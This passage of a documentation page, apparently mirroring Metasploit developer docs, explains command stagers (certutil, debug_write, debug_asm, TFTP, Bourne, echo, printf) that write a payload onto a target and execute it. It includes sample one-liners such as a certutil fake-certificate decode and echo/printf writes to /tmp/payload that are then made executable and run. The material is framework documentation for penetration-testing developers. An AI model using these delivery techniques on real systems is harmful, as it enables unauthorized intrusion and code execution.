<p>You will also need to make sure the module's supported platforms include windows (also in the metadata), example:</p>
<div class="highlight"><pre><span></span><span class="s1">&#39;Platform&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;win&#39;</span>
</pre></div>

<h2 id="certutil-command-stager-windows-only">Certutil Command Stager - Windows Only</h2>
<p><a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/certutil.rb">Certutil</a> is a Windows command that can be used to dump and display certification authority, configuration information, configure certificate services, back and restore CA components, etc. It only comes with newer Windows systems starting from Windows 2012, and Windows 8.</p>
<p>One thing certutil can also do for us is decode the Base64 string from a certificate, and save the decoded content to a file. The following demonstrates:</p>
<div class="highlight"><pre><span></span><span class="nb">echo</span> -----BEGIN CERTIFICATE----- &gt; encoded.txt
<span class="nb">echo</span> Just Base64 encode your binary data
<span class="nb">echo</span> <span class="nv">TVoAAA</span><span class="o">==</span> &gt;&gt; encoded.txt
<span class="nb">echo</span> -----END CERTIFICATE----- &gt;&gt; encoded.txt
certutil -decode encoded.txt decoded.bin
</pre></div>

<p>To take advantage of that, the Certutil command stager will save the payload in Base64 as a fake certificate, ask certutil to decode it, and then finally execute it.</p>
<p>To use the Certutil command stager, either specify your CmdStagerFlavor in the metadata:</p>
<div class="highlight"><pre><span></span><span class="s1">&#39;CmdStagerFlavor&#39;</span> <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;certutil&#39;</span> <span class="o">]</span>
</pre></div>

<p>Or set the :certutil key to execute_cmdstager:</p>
<div class="highlight"><pre><span></span><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor</span><span class="p">:</span> <span class="ss">:certutil</span><span class="p">)</span>
</pre></div>

<p>You will also need to remember to set the platform in the metadata:</p>
<div class="highlight"><pre><span></span><span class="s1">&#39;Platform&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;win&#39;</span>
</pre></div>

<h2 id="debug_write-command-stager-windows-only">Debug_write Command Stager - Windows Only</h2>
<p>The <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/debug_write.rb">debug_write</a> command stager is an old Windows trick to write a file to the system. In this case, we use debug.exe to write a small .Net binary, and that binary will take a hex-ascii file created by the echo command, decode the binary, and finally execute.</p>
<p>Obviously, to be able to use this command stager, you must make sure the target is a Windows system that supports .Net.</p>
<p>To use the debug_write command stager, either specify your CmdStagerFlavor in the metadata:</p>
<div class="highlight"><pre><span></span><span class="s1">&#39;CmdStagerFlavor&#39;</span> <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;debug_write&#39;</span> <span class="o">]</span>
</pre></div>

<p>Or set the :debug_write key to execute_cmdstager:</p>
<div class="highlight"><pre><span></span><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor</span><span class="p">:</span> <span class="ss">:debug_write</span><span class="p">)</span>
</pre></div>

<p>You will also need to remember to set the platform in the metadata:</p>
<div class="highlight"><pre><span></span><span class="s1">&#39;Platform&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;win&#39;</span>
</pre></div>

<h2 id="debug_asm-command-stager-windows-only">Debug_asm Command Stager - Windows Only</h2>
<p>The <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/debug_asm.rb">debug_asm</a> command stager is another old Windows trick used to assemble a COM file, and then COM file will decode our hex-ascii payload, and then execute it.</p>
<p>To use the debug_asm command stager, either specify your CmdStagerFlavor in the metadata:</p>
<div class="highlight"><pre><span></span><span class="s1">&#39;CmdStagerFlavor&#39;</span> <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;debug_asm&#39;</span> <span class="o">]</span>
</pre></div>

<p>Or set the :debug_asm key to execute_cmdstager:</p>
<div class="highlight"><pre><span></span><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor</span><span class="p">:</span> <span class="ss">:debug_asm</span><span class="p">)</span>
</pre></div>

<p>You will also need to remember to set the platform in the metadata:</p>
<div class="highlight"><pre><span></span><span class="s1">&#39;Platform&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;win&#39;</span>
</pre></div>

<h2 id="tftp-command-stager-windows-only">TFTP Command Stager - Windows Only</h2>
<p>The <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/tftp.rb">TFTP</a> command stager uses tftpd.exe to download our payload, and then use the start.exe command to execute it. This technique only works well against an older version of Windows (such as XP), because newer Windows machines no longer install tftp.exe by default.</p>
<p>The TFTP command stager must bind to UDP port 69, so msfconsole must be started as root:</p>
<div class="highlight"><pre><span></span>rvmsudo ./msfconsole
</pre></div>

<p>To use the TFTP stager, either specify your CmdStagerFlavor in the metadata:</p>
<div class="highlight"><pre><span></span><span class="s1">&#39;CmdStagerFlavor&#39;</span> <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;tftp&#39;</span> <span class="o">]</span>
</pre></div>

<p>Or set the :tftp key to execute_cmdstager:</p>
<div class="highlight"><pre><span></span><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor</span><span class="p">:</span> <span class="ss">:tftp</span><span class="p">)</span>
</pre></div>

<p>You will also need to remember to set the platform in the metadata:</p>
<div class="highlight"><pre><span></span><span class="s1">&#39;Platform&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;win&#39;</span>
</pre></div>

<h2 id="bourne-command-stager-multi-platform">Bourne Command Stager - Multi Platform</h2>
<p>The <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/bourne.rb">Bourne</a> command stager supports multiple platforms except for Windows (because the use of the which command that Windows does not have). It functions rather similar to the VBS stager, except when it decodes the Base64 payload at runtime, there are multiple commands to choose from: base64, openssl, python, or perl.</p>
<p>To use the Bourne stager, either specify your CmdStagerFlavor in the metadata:</p>
<div class="highlight"><pre><span></span><span class="s1">&#39;CmdStagerFlavor&#39;</span> <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;bourne&#39;</span> <span class="o">]</span>
</pre></div>

<p>Or set the :bourne key to execute_cmdstager:</p>
<div class="highlight"><pre><span></span><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor</span><span class="p">:</span> <span class="ss">:bourne</span><span class="p">)</span>
</pre></div>

<h2 id="echo-command-stager-multi-platform">Echo Command Stager - Multi Platform</h2>
<p>The <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/echo.rb">echo</a> command stager is suitable for multiple platforms except for Windows. It just <a href="http://manpages.ubuntu.com/manpages/trusty/man1/echo.1fun.html">echos</a> the payload, chmod and execute it. An example of that looks similar to this:</p>
<div class="highlight"><pre><span></span>echo -en \\x41\\x41\\x41\\x41 &gt;&gt; /tmp/payload ; chmod 777 /tmp/payload ; /tmp/payload ; rm -f /tmp/payload
</pre></div>

<p>To use the echo stager, either specify your CmdStagerFlavor in the metadata:</p>
<div class="highlight"><pre><span></span><span class="s1">&#39;CmdStagerFlavor&#39;</span> <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;echo&#39;</span> <span class="o">]</span>
</pre></div>

<p>Or set the :bourne key to execute_cmdstager:</p>
<div class="highlight"><pre><span></span><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor</span><span class="p">:</span> <span class="ss">:echo</span><span class="p">)</span>
</pre></div>

<h2 id="printf-command-stager-multi-platform">Printf Command Stager - Multi Platform</h2>
<p>The <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/printf.rb">printf</a> command stager is also suitable for multiple platforms except for Windows. It just uses the printf command to write the payload to disk, chmod and execute it. An example of that looks similar to this:</p>
<div class="highlight"><pre><span></span>printf &#39;\177\177\177\177&#39; &gt;&gt; /tmp/payload ; chmod +x /tmp/payload ; /tmp/payload ; rm -f /tmp/payload
</pre></div>

<p>To use the printf stager, either specify your CmdStagerFlavor in the metadata:</p>
<div class="highlight"><pre><span></span><span class="s1">&#39;CmdStagerFlavor&#39;</span> <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;printf&#39;</span> <span class="o">]</span>
</pre></div>

<p>Or set the :bourne key to execute_cmdstager:</p>
<div class="highlight"><pre><span></span><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor</span><span class="p">:</span> <span class="ss">:printf</span><span class="p">)</span>
</pre></div></div>
        </div>

        <footer class="col-md-12">
            <hr>
                <p>Copyright &copy; 2019 - 2020 darkcode0x00</p>
            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
        </footer>
        <script>
            var base_url = "../../..",
                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
        </script>
        <script src="../../../js/base.js" defer></script>
        <script src="../../../search/main.js" defer></script>

        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="Search Modal" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
                <h4 class="modal-title" id="exampleModalLabel">Search</h4>
            </div>
            <div class="modal-body">
                <p>
                    From here you can search these documents. Enter
                    your search terms below.
                </p>
                <form role="form">
                    <div class="form-group">
                        <input type="text" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
                    </div>
                </form>
                <div id="mkdocs-search-results"></div>
            </div>
            <div class="modal-footer">
            </div>
        </div>
    </div>
</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="Keyboard Shortcuts Modal" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
                <h4 class="modal-title" id="exampleModalLabel">Keyboard Shortcuts</h4>
            </div>
            <div class="modal-body">
              <table class="table">
                <thead>
                  <tr>
                    <th style="width: 20%;">Keys</th>
                    <th>Action</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td class="help shortcut"><kbd>?</kbd></td>
                    <td>Open this help</td>
                  </tr>
                  <tr>
                    <td class="next shortcut"><kbd>n</kbd></td>
                    <td>Next page</td>
                  </tr>
                  <tr>
                    <td class="prev shortcut"><kbd>p</kbd></td>
                    <td>Previous page</td>
                  </tr>
                  <tr>
                    <td class="search shortcut"><kbd>s</kbd></td>
                    <td>Search</td>
                  </tr>
                </tbody>
              </table>
            </div>
            <div class="modal-footer">
            </div>
        </div>
    </div>
</div>

    </body>
</html>
